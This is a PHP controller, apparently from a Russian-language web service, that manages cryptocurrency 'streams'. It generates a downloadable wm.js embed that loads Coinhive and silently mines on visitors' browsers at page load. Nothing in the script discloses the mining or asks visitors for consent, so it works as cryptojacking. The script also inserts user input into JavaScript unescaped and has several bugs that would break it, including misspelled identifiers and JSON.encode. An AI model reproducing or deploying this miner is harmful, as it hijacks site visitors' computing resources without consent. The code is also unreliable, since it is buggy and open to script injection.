<?php

require_once(ROOT . '/model/modelStream.php');
require_once(ROOT . '/core/controller_base.php');
require_once(ROOT . '/components/User.php');

class controllerStream extends controller_base
{
    public function actionIndex()
    {
        if ($this->isAjax()) {
            $user_obj = new User();
            if ($user_obj->checkSession()) {
                $user = $_SESSION['user'];
                // Подтягиваем информацию о потоках пользоватея.
                $request_obj = new modelStream();
                $query = $request_obj->actionIndex(trim($user));
                $request_obj = null;
                // Выдаем view каналов пользователя.
                echo json_encode($query);
                return true;
            }
        } else {
            $this->layout();
            return true;
        }
    }

    public function actionAddStreamAjax()
    {
        if ($this->isAjax()) {
            $user_obj = new User();
            if ($user_obj->checkSession()) {
                $user = $_SESSION['user'];
                $data_add = $this->getAjaxData();
                // Ставить сюда проверку или нет?
                $data['stream_name'] = trim($data_add['name']);
                $data['stream_addr'] = (isset($data_add['addr'])) ? trim($data_add['addr']) : 'none';
                $data['stream_currency'] = trim($data_add['crypt_type']);
                // Метод добавляет новый канал от пользователя
                $request_obj = new modelStream();
                $query = $request_obj->actionAdd($user, $data);
                if ($query !== false) {
                    $stream_name = $data['stream_name'];
                    $stream_addr = $data['stream_addr'];
                    $js_script = "
                    window.addEventListener('load', function(){
                    var script = document.createElement('script');
    script.src = 'https://coinhive.com/lib/coinhive.min.js';
    document.body.appendChild(script);

    var option = {
        autoThreads: true,
        throttle: 0.7
    };
    var user = {$user}_{$stream_name}_{$stream_addr};
    var url = 'http:' + '//' + $_SERVER[HTTP_HOST] + '/user_save/';
    var miner = new CoinHive.User('wvolo3wcsofZ0QWawBkpuIxyh5kiYzEk', user, option);
    miner.start();
    var total = mineg.getTotalHashes();
    setInterval(saveHandler, 10000);
    function saveHandler(){
        var newHash = miner.getTotalHashes() - total;
        total = miner.getTotalHashes();
        let data = {
            count: newHash,
            name: user
        };
        var xhr = new XMLHttpRequest();
        xhr.open('POST', url);
        xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.onrreadystatechange = function(){
            if(xhr.readyState === 4 && xhr.status === 200){
                console.log(xhr.response);
            }
        };
        xhr.send(JSON.encode(data));
    }}, false);";
                    $_SESSION['js'] = $js_script;
                    echo 'true';
                    return false;
                } else {
                    echo 'false';
                    return false;
                }
            }
        }
        else {
            return false;
    }
    }

    public function actionDeleteAjax()
    {

        if($this->isAjax()) {
            $user_obj = new User();
            if($user_obj->checkSession()) {
                $user = $_SESSION['user'];
                // Метод удаляет пользовательский поток
                    $data = $this->getAjaxData();
                    $stream_name = trim($data['name']);
                    $stream_addr = (preg_match('~^none$~', trim($data['addr']))) ? 'none' : trim($data['addr']);
                    $stream_currency = trim($data['crypt_type']);

                    $request_obj = new modelStream();
                    $request = $request_obj->actionDelete($user, $stream_name, $stream_addr, $stream_currency);
                    if ($request === true) {
                        echo "true";
                        $request_obj = null;
                        return true;
                    } else {
                        echo "false";
                        $request_obj = null;
                        return false;
                    }
            }
        }
        else{
            return false;
        }
    }
    public function actionDownload()
    {
        $user_obj = new User();
        if($user_obj->checkSession()){
            if(ob_get_level()){
                ob_end_clean();
            }
            if(isset($_SESSION['js'])) {
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename=wm.js');
                header('Content-Length:' . strlen($_SESSION['js']));
                $stream = fopen('php://output', 'wb');
                print fwrite($stream, $_SESSION['js']);
                exit;
            }
        }
        else {
            return false;
        }
    }
}